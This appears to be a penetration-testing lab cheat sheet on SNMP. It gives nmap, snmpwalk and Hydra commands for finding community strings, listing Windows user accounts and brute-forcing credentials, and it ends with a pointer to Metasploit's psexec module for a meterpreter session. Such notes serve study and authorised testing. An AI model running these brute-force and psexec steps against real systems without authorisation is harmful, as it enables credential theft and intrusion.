# SNMP

**SNMP (Simple Network Management Protocol)**
**Description**: Used to monitor and manage network devices (routers, switches, servers, printers)
**Ports**: UDP port 161 (and port 162 for traps)

<br>

# Enumeration with Nmap and snmpwalk

```shell
nmap -Pn -sV <target_IP>
nmap -sU -p 161 <target_IP>

# The UDP port 161 is open. This information is crucial for our following tasks:

ls /usr/share/nmap/scripts/ | grep snmp
ls -al /usr/share/nmap/scripts/ | grep snmp # -al > All files | Long listing format

nmap -sU -sV -p 161 --script snmp-brute <target_IP>
# As we can see, we found three community names: public, private, and secret
# The script uses the snmpcommunities.lst list for brute-forcing it is located inside /usr/share/nmap/nselib/data/snmpcommunities.lst directory

snmpwalk -v 1 -c public <target_IP>
# This command uses SNMP (Simple Network Management Protocol) to query information from a network device (e.g., router, switch, printer, server). -v  1 is the SNMP version.
# We were able to gather a lot of information via SNMP. However, the output may not be in a human-readable format.

nmap -sU -p 161 --script snmp-* <target_IP> > snmp_output
# The above command would run all the nmap SNMP scripts on the target machine and store its output to the snmp_output file.
ls

nmap -sU -p 161 --script snmp-win32-users <target_IP>
# Attempts to enumerate Windows user accounts through SNMP
# snmp-win32-users: Administrator, DefaultAccount, Guest, WDAGUtilityAccount, admin

nmap -sU -p 161 --script snmp-* <target_IP> > snmp_output
```

- Now, let's run a brute-force attack using these windows users on SMB service.
- Hydra successfully found a valid password for administrator and admin users.

```shell
hydra -P <community_wordlist> <target_IP> snmp
# Performs brute-force attack on SNMP by trying community strings from the provided wordlist.
# Default SNMP port is 161 (UDP), but Hydra handles it automatically.
# Common community strings to try: public, private, manager.
```

- *Run the `psexec` (smb) Metasploit exploit module to gain the meterpreter session using these credentials.*
